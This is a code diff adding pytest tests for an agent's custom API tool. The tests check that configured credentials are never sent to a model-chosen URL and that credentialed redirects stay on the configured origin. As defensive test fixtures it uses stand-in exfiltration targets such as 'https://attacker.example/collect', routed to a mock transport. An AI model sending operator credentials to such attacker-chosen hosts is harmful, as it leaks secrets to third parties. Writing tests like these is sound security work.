@@ -7,7 +7,7 @@ import json
 import sys
 import threading
 import weakref
-from collections.abc import Iterator
+from collections.abc import Callable, Iterator
 from dataclasses import replace
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
@@ -16,6 +16,7 @@ from typing import Never
 from unittest.mock import AsyncMock
 
 import agno.tools.crawl4ai as agno_crawl4ai
+import httpx
 import pytest
 from agno.tools import Toolkit
 
@@ -254,6 +255,95 @@ def test_custom_api_tool_rejects_unsafe_url_before_request(
         tool.make_request(endpoint)
 
     assert exc_info.value.reason == reason
+
+
+def _install_custom_api_transport(
+    monkeypatch: pytest.MonkeyPatch,
+    respond: Callable[[httpx.Request], httpx.Response],
+) -> list[httpx.Request]:
+    """Route custom_api requests to an in-memory handler and record every request it sends."""
+    sent: list[httpx.Request] = []
+
+    def handle(request: httpx.Request) -> httpx.Response:
+        sent.append(request)
+        return respond(request)
+
+    monkeypatch.setattr(custom_api_module, "validate_server_fetch_url", lambda url: url)
+    monkeypatch.setattr(custom_api_module, "ServerFetchHTTPTransport", lambda **_kwargs: httpx.MockTransport(handle))
+    return sent
+
+
+@pytest.mark.parametrize(
+    "credentials",
+    [
+        {"api_key": "sk-operator"},
+        {"username": "operator", "password": "operator-password"},
+        {"headers": {"X-Api-Key": "operator-secret"}},
+    ],
+)
+def test_custom_api_tool_refuses_configured_credentials_without_base_url(
+    monkeypatch: pytest.MonkeyPatch,
+    credentials: dict[str, object],
+) -> None:
+    """Configured credentials are never sent to a URL the model chooses."""
+    sent = _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, json={}))
+    tool = custom_api_tools()(**credentials)
+
+    payload = json.loads(tool.make_request("https://attacker.example/collect"))
+
+    assert "base_url" in payload["error"]
+    assert sent == []
+
+
+def test_custom_api_tool_keeps_configured_credentials_on_the_base_url_origin(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Credentialed requests follow redirects within the base_url origin and refuse a hop to any other origin."""
+    redirects = {
+        "/v1/moved": "https://api.example.com/v1/current",
+        "/v1/open-redirect": "https://other.example/collect",
+        "/v1/downgrade": "http://api.example.com/v1/current",
+    }
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        if location := redirects.get(request.url.path):
+            return httpx.Response(302, headers={"Location": location})
+        return httpx.Response(200, json={"ok": True})
+
+    sent = _install_custom_api_transport(monkeypatch, respond)
+    tool = custom_api_tools()(
+        base_url="https://api.example.com/v1",
+        api_key="sk-operator",
+        headers={"X-Api-Key": "operator-secret"},
+    )
+
+    assert json.loads(tool.make_request("moved"))["data"] == {"ok": True}
+    assert [str(request.url) for request in sent] == [
+        "https://api.example.com/v1/moved",
+        "https://api.example.com/v1/current",
+    ]
+    assert all(request.headers["X-Api-Key"] == "operator-secret" for request in sent)
+    assert all(request.headers["Authorization"] == "Bearer sk-operator" for request in sent)
+
+    for endpoint in ("open-redirect", "downgrade"):
+        sent.clear()
+        payload = json.loads(tool.make_request(endpoint))
+        assert "another origin" in payload["error"]
+        assert [str(request.url) for request in sent] == [f"https://api.example.com/v1/{endpoint}"]
+
+
+def test_custom_api_tool_without_credentials_follows_redirects_anywhere_public(monkeypatch: pytest.MonkeyPatch) -> None:
+    """An uncredentialed request has nothing to leak, so full URLs and cross-origin redirects keep working."""
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        if request.url.host == "start.example":
+            return httpx.Response(302, headers={"Location": "https://cdn.example/data"})
+        return httpx.Response(200, json={"ok": True})
+
+    sent = _install_custom_api_transport(monkeypatch, respond)
+
+    payload = json.loads(custom_api_tools()().make_request("https://start.example/data"))
+
+    assert payload["data"] == {"ok": True}
+    assert [request.url.host for request in sent] == ["start.example", "cdn.example"]
 
 
 def test_custom_api_tool_filters_sensitive_response_headers(monkeypatch: pytest.MonkeyPatch) -> None:
